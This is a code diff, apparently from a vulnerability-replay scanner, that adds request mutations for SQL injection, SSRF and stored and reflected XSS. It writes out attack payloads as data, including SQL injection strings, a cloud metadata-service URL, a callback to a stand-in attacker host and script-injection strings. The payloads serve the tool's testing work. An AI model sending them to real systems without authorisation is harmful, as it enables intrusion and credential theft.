@@ -229,6 +229,90 @@ def build_mutations(candidate: WorkflowPathFindingCandidate, replay_requests: li
             )
         )
 
+    if candidate.vulnerability_class == "sqli":
+        mutations.extend(
+            [
+                ReplayMutationSpec(
+                    type=ReplayMutationType.QUERY_SET,
+                    target_request_fingerprint=final_request.request_fingerprint,
+                    query_param="q",
+                    value="' OR '1'='1",
+                ),
+                ReplayMutationSpec(
+                    type=ReplayMutationType.QUERY_SET,
+                    target_request_fingerprint=final_request.request_fingerprint,
+                    query_param="filter",
+                    value="1 OR 1=1",
+                ),
+                ReplayMutationSpec(
+                    type=ReplayMutationType.BODY_JSON_SET,
+                    target_request_fingerprint=final_request.request_fingerprint,
+                    body_field="query",
+                    value="' UNION SELECT 1 --",
+                ),
+            ]
+        )
+
+    if candidate.vulnerability_class == "ssrf":
+        mutations.extend(
+            [
+                ReplayMutationSpec(
+                    type=ReplayMutationType.QUERY_SET,
+                    target_request_fingerprint=final_request.request_fingerprint,
+                    query_param="url",
+                    value="http://169.254.169.254/latest/meta-data/",
+                ),
+                ReplayMutationSpec(
+                    type=ReplayMutationType.BODY_JSON_SET,
+                    target_request_fingerprint=final_request.request_fingerprint,
+                    body_field="url",
+                    value="http://169.254.169.254/latest/meta-data/",
+                ),
+                ReplayMutationSpec(
+                    type=ReplayMutationType.BODY_JSON_SET,
+                    target_request_fingerprint=final_request.request_fingerprint,
+                    body_field="callback_url",
+                    value="https://attacker.example.invalid/hook",
+                ),
+            ]
+        )
+
+    if candidate.vulnerability_class == "stored_xss":
+        mutations.extend(
+            [
+                ReplayMutationSpec(
+                    type=ReplayMutationType.BODY_JSON_SET,
+                    target_request_fingerprint=final_request.request_fingerprint,
+                    body_field="content",
+                    value="<script>alert('stored-xss')</script>",
+                ),
+                ReplayMutationSpec(
+                    type=ReplayMutationType.BODY_JSON_SET,
+                    target_request_fingerprint=final_request.request_fingerprint,
+                    body_field="message",
+                    value="<img src=x onerror=alert('stored-xss')>",
+                ),
+            ]
+        )
+
+    if candidate.vulnerability_class == "reflected_xss":
+        mutations.extend(
+            [
+                ReplayMutationSpec(
+                    type=ReplayMutationType.QUERY_SET,
+                    target_request_fingerprint=final_request.request_fingerprint,
+                    query_param="q",
+                    value="<script>alert('reflected-xss')</script>",
+                ),
+                ReplayMutationSpec(
+                    type=ReplayMutationType.QUERY_SET,
+                    target_request_fingerprint=final_request.request_fingerprint,
+                    query_param="search",
+                    value="<svg/onload=alert('reflected-xss')>",
+                ),
+            ]
+        )
+
     return mutations
 
 
